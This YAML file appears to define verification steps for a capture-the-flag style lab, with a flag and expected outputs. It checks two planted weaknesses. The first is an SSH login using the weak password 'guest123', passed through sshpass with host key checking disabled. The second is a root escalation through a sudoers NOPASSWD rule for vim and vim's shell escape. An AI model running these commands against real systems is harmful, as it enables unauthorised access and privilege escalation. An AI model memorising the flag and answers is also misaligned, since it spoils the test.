- entity_id: ssh_weak_credentials
  procedure:
    sessions: []
    procedure:
    - step_id: verify_ssh_running
      session: null
      action:
        type: exec_target
        command: ss -tlnp | grep ':22'
      expect:
        stdout_contains: :22
      outputs: {}
      timeout: 10
    - step_id: attempt_ssh_login
      session: null
      action:
        type: exec_attacker
        command: sshpass -p 'guest123' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10
          guest@${target_host} 'id && cat /home/guest/flag.txt'
      expect:
        stdout_contains: uid=1000(guest)
      outputs: {}
      timeout: 30
    - step_id: verify_flag
      session: null
      action:
        type: exec_attacker
        command: sshpass -p 'guest123' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10
          guest@${target_host} 'cat /home/guest/flag.txt'
      expect:
        stdout_contains: FLAG{weak_credentials_ssh_compromised}
      outputs: {}
      timeout: 30
    - step_id: verify_no_sudo
      session: null
      action:
        type: exec_attacker
        command: sshpass -p 'guest123' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10
          guest@${target_host} 'id && groups'
      expect:
        stdout_contains: gid=1000(guest) groups=1000(guest)
      outputs: {}
      timeout: 30
- entity_id: sudo_privesc_root
  procedure:
    sessions: []
    procedure:
    - step_id: verify_lowpriv_user_exists
      session: null
      action:
        type: exec_target
        command: id lowpriv
      expect:
        stdout_contains: lowpriv
      outputs: {}
      timeout: 10
    - step_id: verify_sudoers_rule
      session: null
      action:
        type: exec_target
        command: cat /etc/sudoers.d/lowpriv
      expect:
        stdout_contains: 'NOPASSWD: /usr/bin/vim'
      outputs: {}
      timeout: 10
    - step_id: exploit_sudo_vim_privesc
      session: null
      action:
        type: exec_target
        command: su -s /bin/bash lowpriv -c 'sudo /usr/bin/vim -c ":!/bin/bash -c
          id" /dev/null'
      expect:
        stdout_contains: uid=0(root) gid=0(root)
      outputs: {}
      timeout: 15
